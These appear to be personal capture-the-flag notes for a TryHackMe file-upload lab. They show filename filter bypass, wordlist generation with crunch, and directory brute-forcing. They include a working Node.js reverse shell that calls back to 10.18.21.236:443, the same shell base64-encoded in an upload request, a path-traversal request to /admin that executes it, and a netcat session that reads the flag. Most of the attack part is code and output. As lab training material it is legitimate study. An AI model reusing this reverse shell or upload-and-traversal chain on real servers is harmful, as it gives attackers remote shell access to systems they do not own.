
When renaming the script shell.jpg we got:

```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 01 Apr 2024 06:06:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"7-U6VofLJtxB8qtAM+l+E63v03QNY"
Front-End-Https: on

success
```

Apparently what the server catches is the file name, as this is out revsh with the magic number and rename. The same file is caught when called "shell.jpg.php".


Where are the files uploaded? It's supposed to be loaded on the front screen with the other images. Where are they?

![[Images/Pasted image 20240401112911.png|900]]
On mouse over one of the images shows the path being "content"

Feroxbuster




generting wordlist:
```sh
┌──(kali㉿kali)-[~/shells]
└─$ crunch 3 3 ABCDEFGIJKLMNOPQRSTUVWXYZ -o 3letters.txt 
Crunch will now generate the following amount of data: 62500 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 15625 

crunch: 100% completed generating output
                                                                                                                              
┌──(kali㉿kali)-[~/shells]
└─$ cat 3letters.txt                                    
AAA
AAB
AAC
AAD
...
ZZW
ZZX
ZZY
ZZZ
```

![[Images/Pasted image 20240401150638.png]]

Node js rev sh script, no magic number:
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.18.21.236", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

```http
POST / HTTP/1.1
Host: jewel.uploadvulns.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 585
Origin: http://jewel.uploadvulns.thm
Connection: close
Referer: http://jewel.uploadvulns.thm/
DNT: 1
Sec-GPC: 1

{"name":"revsh.jpg","type":"image/jpeg","file":"data:image/jpeg;base64,KGZ1bmN0aW9uKCl7CiAgICB2YXIgbmV0ID0gcmVxdWlyZSgibmV0IiksCiAgICAgICAgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksCiAgICAgICAgc2ggPSBjcC5zcGF3bigiL2Jpbi9zaCIsIFtdKTsKICAgIHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwogICAgY2xpZW50LmNvbm5lY3QoNDQzLCAiMTAuMTguMjEuMjM2IiwgZnVuY3Rpb24oKXsKICAgICAgICBjbGllbnQucGlwZShzaC5zdGRpbik7CiAgICAgICAgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsKICAgICAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOwogICAgfSk7CiAgICByZXR1cm4gL2EvOyAvLyBQcmV2ZW50cyB0aGUgTm9kZS5qcyBhcHBsaWNhdGlvbiBmcm9tIGNyYXNoaW5nCn0pKCk7Cg=="}
```

![[Images/Pasted image 20240401200332.png]]

![[Images/Pasted image 20240401150452.png]]

```http
POST /admin HTTP/1.1
Host: jewel.uploadvulns.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://jewel.uploadvulns.thm
Connection: close
Referer: http://jewel.uploadvulns.thm/admin
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

cmd=..%2Fcontent%2FLBB.jpg..


```

![[Images/Pasted image 20240401200446.png]]

```sh
┌──(kali㉿kali)-[~/shells]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.89.15] 39006

ls
assets
content
html
index.js
modules
node_modules
package.json
ls -la                              
total 44
drwxr-xr-x  1 root root 4096 Jul  3  2020 .
drwxr-xr-x  1 root root 4096 Jul  3  2020 ..
drwxrwxr-x  6 root root 4096 Jul  3  2020 assets
drwxrwxr-x  1 root root 4096 Apr  1 12:41 content
drwxrwxr-x  2 root root 4096 Jul  3  2020 html
-rw-rw-r--  1 root root 2372 Jul  3  2020 index.js
drwxrwxr-x  2 root root 4096 Jul  3  2020 modules
drwxrwxr-x 61 root root 4096 Jul  3  2020 node_modules
-rw-rw-r--  1 root root  337 Jun 13  2020 package.json
pwd
/var/www/html
cd..
/bin/sh: 5: cd..: not found
cd 
cd ..
ls -la
total 60
drwxr-xr-x   1 root root 4096 Jul  3  2020 .
drwxr-xr-x   1 root root 4096 Jul  3  2020 ..
-rwxr-xr-x   1 root root    0 Jul  3  2020 .dockerenv
lrwxrwxrwx   1 root root    7 Jun  6  2020 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  360 Apr  1 12:31 dev
drwxr-xr-x   1 root root 4096 Jul  3  2020 etc
drwxr-xr-x   2 root root 4096 Apr 15  2020 home
lrwxrwxrwx   1 root root    7 Jun  6  2020 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jun  6  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jun  6  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jun  6  2020 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Jun  6  2020 media
drwxr-xr-x   2 root root 4096 Jun  6  2020 mnt
drwxr-xr-x   2 root root 4096 Jun  6  2020 opt
dr-xr-xr-x 150 root root    0 Apr  1 12:31 proc
drwx------   1 root root 4096 Jul  3  2020 root
drwxr-xr-x   1 root root 4096 Jun 17  2020 run
lrwxrwxrwx   1 root root    8 Jun  6  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Jun  6  2020 srv
dr-xr-xr-x  13 root root    0 Apr  1 12:31 sys
drwxrwxrwt   1 root root 4096 Jul  3  2020 tmp
drwxr-xr-x   1 root root 4096 Jun  6  2020 usr
drwxr-xr-x   1 root root 4096 Jul  3  2020 var
pwd
/
cd var
cd www
ls -la
total 28
drwxr-xr-x 1 root root 4096 Jul  3  2020 .
drwxr-xr-x 1 root root 4096 Jul  3  2020 ..
-rw-r--r-- 1 root root   38 Jul  3  2020 flag.txt
drwxr-xr-x 1 root root 4096 Jul  3  2020 html
cat flag.txt
THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}
```